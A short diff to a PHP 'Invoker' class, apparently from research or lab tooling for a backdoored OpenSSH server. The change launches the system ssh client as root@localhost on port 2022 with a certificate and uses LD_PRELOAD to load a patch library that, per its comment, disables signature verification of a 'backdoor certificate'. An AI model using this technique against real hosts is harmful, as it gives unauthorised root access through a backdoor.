@@ -864,12 +864,17 @@ class Invoker {
         $sshd_port = 2022;
 
         say('running ssh client');
-        pcntl_exec('/root/sshd/openssh/openssh-9.6p1/ssh', [
+        $ssh = rtrim(shell_exec('which ssh'));
+
+        $envp = getenv();
+        // patch to disable signature verification of backdoor certificate
+        $envp['LD_PRELOAD'] = path_combine(__DIR__, 'build', 'libssh_patch.so');
+        pcntl_exec($ssh, [
             '-vvvv',
             '-i', $this->gdb_file('id_rsa-cert2.pub'),
             '-p', $sshd_port,
             'root@localhost'
-        ]);
+        ], $envp);
     }
 
     public function ssh_server_main(){
